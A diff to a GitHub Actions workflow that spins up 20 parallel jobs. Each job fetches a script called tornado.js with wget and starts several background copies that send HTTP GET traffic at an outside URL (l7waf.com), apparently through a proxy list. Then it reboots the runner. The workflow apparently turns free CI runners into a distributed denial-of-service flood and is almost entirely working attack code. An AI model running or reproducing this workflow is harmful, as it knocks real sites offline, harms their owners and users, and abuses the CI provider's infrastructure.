@@ -1,4 +1,4 @@
-  name: Ubuntu VDS 50 saniye t
+name: Ubuntu VDS 50 saniye tornada
 
 on:
   workflow_dispatch:
@@ -9,10 +9,12 @@ jobs:
     strategy:
       max-parallel: 25
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
-
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
       - name: OK !
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
@@ -24,13 +26,13 @@ jobs:
             timeout 75 node tornado.js GET https://l7waf.com/ 70 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
-          
+
           for pid in "${PIDS[@]}"; do
             wait $pid
           done
 
       - name: OK !
         run: sleep 75
-        
+
       - name: OK !
         run: sudo reboot
